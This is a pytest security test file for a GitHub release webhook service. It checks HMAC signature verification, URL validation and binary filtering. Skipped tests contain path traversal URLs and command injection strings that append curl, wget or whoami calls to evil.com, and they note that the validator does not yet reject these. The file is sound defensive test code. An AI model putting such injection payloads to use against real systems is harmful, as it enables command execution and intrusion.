#!/usr/bin/env python3
"""
Security tests for GitHub webhook service.

These tests focus on security-critical paths including:
- HMAC signature verification
- URL validation and injection prevention
- Binary filtering
- Malicious payload handling

NOTE: Some tests document security improvements that SHOULD be made.
"""

import hmac
import hashlib
import json
import sys
import pytest
from pathlib import Path

# Import the webhook_service module
sys.path.insert(0, str(Path(__file__).parent))
from webhook_service import (
    verify_webhook_signature,
    validate_github_url,
    matches_binary_filter,
    extract_qualifying_binaries,
)


class TestWebhookSignatureVerification:
    """Test HMAC signature verification security."""

    def test_valid_signature_accepted(self):
        """Test that valid signatures are accepted."""
        secret = "test-secret-key"
        payload = b'{"test": "data"}'

        # Generate valid signature
        expected_signature = hmac.new(secret.encode("utf-8"), payload, hashlib.sha256).hexdigest()
        signature_header = f"sha256={expected_signature}"

        assert verify_webhook_signature(payload, signature_header, secret) is True

    def test_invalid_signature_rejected(self):
        """Test that invalid signatures are rejected."""
        secret = "test-secret-key"
        payload = b'{"test": "data"}'
        invalid_signature = "sha256=" + "0" * 64  # Invalid hash

        assert verify_webhook_signature(payload, invalid_signature, secret) is False

    def test_timing_attack_resistance(self):
        """Test that comparison uses hmac.compare_digest (constant-time)."""
        secret = "test-secret-key"
        payload = b'{"test": "data"}'

        # Generate valid signature
        valid_sig = hmac.new(secret.encode("utf-8"), payload, hashlib.sha256).hexdigest()

        # Create signatures with varying correct prefix lengths
        # If comparison is not constant-time, these would take different times
        test_cases = [
            "sha256=" + "0" * 64,  # All wrong
            "sha256=" + valid_sig[:10] + "0" * 54,  # 10 chars correct
            "sha256=" + valid_sig[:32] + "0" * 32,  # Half correct
            "sha256=" + valid_sig[:60] + "0" * 4,  # Almost correct
        ]

        for invalid_sig in test_cases:
            assert verify_webhook_signature(payload, invalid_sig, secret) is False

    def test_missing_signature_header_rejected(self):
        """Test that missing signature header is rejected."""
        secret = "test-secret-key"
        payload = b'{"test": "data"}'

        assert verify_webhook_signature(payload, None, secret) is False
        assert verify_webhook_signature(payload, "", secret) is False

    def test_missing_secret_rejected(self):
        """Test that missing secret causes rejection."""
        payload = b'{"test": "data"}'
        signature = "sha256=abc123"

        assert verify_webhook_signature(payload, signature, None) is False
        assert verify_webhook_signature(payload, signature, "") is False

    def test_malformed_signature_format_rejected(self):
        """Test that malformed signature formats are rejected."""
        secret = "test-secret-key"
        payload = b'{"test": "data"}'

        malformed_signatures = [
            "not-sha256-prefix",
            "sha256",  # Missing equals and hash
            "sha256=",  # Missing hash
            "sha1=abcd1234",  # Wrong algorithm
        ]

        for sig in malformed_signatures:
            assert verify_webhook_signature(payload, sig, secret) is False, f"Failed to reject: {sig}"

    def test_wrong_secret_rejected(self):
        """Test that wrong secret causes rejection."""
        correct_secret = "correct-secret"
        wrong_secret = "wrong-secret"
        payload = b'{"test": "data"}'

        # Generate signature with correct secret
        valid_sig = hmac.new(correct_secret.encode("utf-8"), payload, hashlib.sha256).hexdigest()
        signature_header = f"sha256={valid_sig}"

        # Verify with wrong secret should fail
        assert verify_webhook_signature(payload, signature_header, wrong_secret) is False

    def test_modified_payload_rejected(self):
        """Test that signature fails if payload is modified."""
        secret = "test-secret-key"
        original_payload = b'{"test": "data"}'
        modified_payload = b'{"test": "modified"}'

        # Generate signature for original
        valid_sig = hmac.new(secret.encode("utf-8"), original_payload, hashlib.sha256).hexdigest()
        signature_header = f"sha256={valid_sig}"

        # Verify with modified payload should fail
        assert verify_webhook_signature(modified_payload, signature_header, secret) is False


class TestURLValidation:
    """Test GitHub URL validation."""

    def test_valid_github_urls_accepted(self):
        """Test that valid GitHub release URLs are accepted."""
        # Valid URLs with required /releases/download/
        valid_urls = [
            "https://github.com/user/repo/releases/download/v1.0.0/file.zip",
            "https://github.com/dirkhh/adsb-feeder-image/releases/download/v1.2.3/adsb-feeder.img.xz",
        ]

        for url in valid_urls:
            assert validate_github_url(url) is True, f"Failed to accept valid URL: {url}"

    def test_http_urls_rejected(self):
        """Test that HTTP (not HTTPS) URLs are rejected."""
        http_urls = [
            "http://github.com/user/repo/releases/download/v1.0.0/file.zip",
        ]

        for url in http_urls:
            assert validate_github_url(url) is False, f"Failed to reject HTTP URL: {url}"

    def test_missing_releases_download_path_rejected(self):
        """Test that URLs without /releases/download/ are rejected."""
        # Current implementation only checks for /releases/download/ pattern
        invalid_paths = [
            "https://github.com/user/repo/file.zip",
            "https://github.com/user/repo/raw/main/file.zip",
        ]

        for url in invalid_paths:
            assert validate_github_url(url) is False, f"Failed to reject URL without /releases/download/: {url}"

    def test_malformed_urls_handled(self):
        """Test that malformed URLs are handled."""
        malformed_urls = [
            "not-a-url",
            "github.com/user/repo",  # Missing protocol
            "ftp://github.com/user/repo",  # Wrong protocol
        ]

        for url in malformed_urls:
            # Should return False (validation fails)
            assert validate_github_url(url) is False, f"Failed to reject malformed URL: {url}"

    def test_wrong_domain_detection(self):
        """Test detection of non-GitHub domains.

        NOTE: Current implementation may accept some URLs that look like GitHub.
        This test documents expected behavior."""
        # Clear non-GitHub domains should be rejected
        assert validate_github_url("https://evil.com/releases/download/file.zip") is False

    # SECURITY IMPROVEMENT NEEDED: The following tests document security gaps
    # that should be addressed in the webhook_service.py implementation

    @pytest.mark.skip(reason="SECURITY IMPROVEMENT NEEDED: Add path traversal validation")
    def test_path_traversal_should_be_rejected(self):
        """Documents that path traversal URLs should be rejected (future improvement)."""
        traversal_attempts = [
            "https://github.com/user/repo/releases/download/../../etc/passwd",
            "https://github.com/user/repo/releases/download/../../../secrets",
        ]

        for url in traversal_attempts:
            # This SHOULD return False but currently doesn't
            assert validate_github_url(url) is False, f"Should reject path traversal: {url}"

    @pytest.mark.skip(reason="SECURITY IMPROVEMENT NEEDED: Add command injection validation")
    def test_command_injection_should_be_rejected(self):
        """Documents that command injection attempts should be rejected (future improvement)."""
        injection_attempts = [
            "https://github.com/user/repo/releases/download/v1.0/file.zip;curl evil.com",
            "https://github.com/user/repo/releases/download/v1.0/file.zip`whoami`",
            "https://github.com/user/repo/releases/download/v1.0/file.zip|wget evil.com",
        ]

        for url in injection_attempts:
            # This SHOULD return False but currently doesn't
            assert validate_github_url(url) is False, f"Should reject injection: {url}"


class TestBinaryFiltering:
    """Test binary filtering logic."""

    def test_raspberrypi64_required(self):
        """Test that binary must contain 'raspberrypi64'."""
        assert matches_binary_filter("adsb-feeder-raspberrypi64-pi-2-3-4-v1.0.img.xz", "v1.0") is True
        assert matches_binary_filter("adsb-feeder-arm64-pi-2-3-4-v1.0.img.xz", "v1.0") is False

    def test_pi_4_required_in_version(self):
        """Test that '4' must be in the pi version numbers."""
        assert matches_binary_filter("adsb-feeder-raspberrypi64-pi-2-3-4-v1.0.img.xz", "v1.0") is True
        assert matches_binary_filter("adsb-feeder-raspberrypi64-pi-2-3-4-5-v1.0.img.xz", "v1.0") is True
        assert matches_binary_filter("adsb-feeder-raspberrypi64-pi-5-v1.0.img.xz", "v1.0") is False

    def test_testbuild_filtering(self):
        """Test that testbuild assets are filtered by git hash."""
        release_name = "testbuild-g-12345678"

        # Should match testbuild with correct hash
        assert matches_binary_filter("adsb-feeder-raspberrypi64-pi-2-3-4-testbuild-g-12345678.img.xz", release_name) is True

        # Should not match testbuild with different hash (different testbuild)
        assert matches_binary_filter("adsb-feeder-raspberrypi64-pi-2-3-4-testbuild-g-87654321.img.xz", release_name) is False


class TestExtractQualifyingBinaries:
    """Test binary extraction from webhook payloads."""

    def test_extract_valid_binaries(self):
        """Test extraction of valid qualifying binaries."""
        release_data = {
            "release": {
                "name": "v1.0.0",
                "assets": [
                    {
                        "name": "adsb-feeder-raspberrypi64-pi-2-3-4-v1.0.0.img.xz",
                        "browser_download_url": "https://github.com/user/repo/releases/download/v1.0.0/adsb-feeder-raspberrypi64-pi-2-3-4-v1.0.0.img.xz",
                    },
                    {
                        "name": "adsb-feeder-raspberrypi64-pi-5-v1.0.0.img.xz",  # Should be filtered out (no '4')
                        "browser_download_url": "https://github.com/user/repo/releases/download/v1.0.0/adsb-feeder-raspberrypi64-pi-5-v1.0.0.img.xz",
                    },
                ],
            },
            "changes": {"name": {"from": ""}},
        }

        binaries = extract_qualifying_binaries(release_data)

        assert len(binaries) == 1
        assert binaries[0]["name"] == "adsb-feeder-raspberrypi64-pi-2-3-4-v1.0.0.img.xz"

    def test_extract_rejects_invalid_urls(self):
        """Test that extraction rejects assets with invalid URLs."""
        release_data = {
            "release": {
                "name": "v1.0.0",
                "assets": [
                    {
                        "name": "adsb-feeder-raspberrypi64-pi-2-3-4-v1.0.0.img.xz",
                        "browser_download_url": "http://evil.com/malicious.exe",  # Invalid domain/HTTP
                    },
                ],
            },
            "changes": {"name": {"from": ""}},
        }

        binaries = extract_qualifying_binaries(release_data)

        assert len(binaries) == 0  # Should reject invalid URL

    def test_extract_handles_missing_assets(self):
        """Test that extraction handles missing assets gracefully."""
        release_data = {"release": {}, "changes": {"name": {"from": ""}}}

        binaries = extract_qualifying_binaries(release_data)

        assert binaries == []

    def test_extract_uses_release_name_fallback(self):
        """Test that extraction falls back to release.name if changes.name.from is empty."""
        release_data = {
            "release": {
                "name": "testbuild-g-12345678",
                "assets": [
                    {
                        "name": "adsb-feeder-raspberrypi64-pi-2-3-4-testbuild-g-12345678.img.xz",
                        "browser_download_url": "https://github.com/user/repo/releases/download/test/file.img.xz",
                    },
                ],
            },
            "changes": {"name": {"from": ""}},
        }

        binaries = extract_qualifying_binaries(release_data)

        assert len(binaries) == 1


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
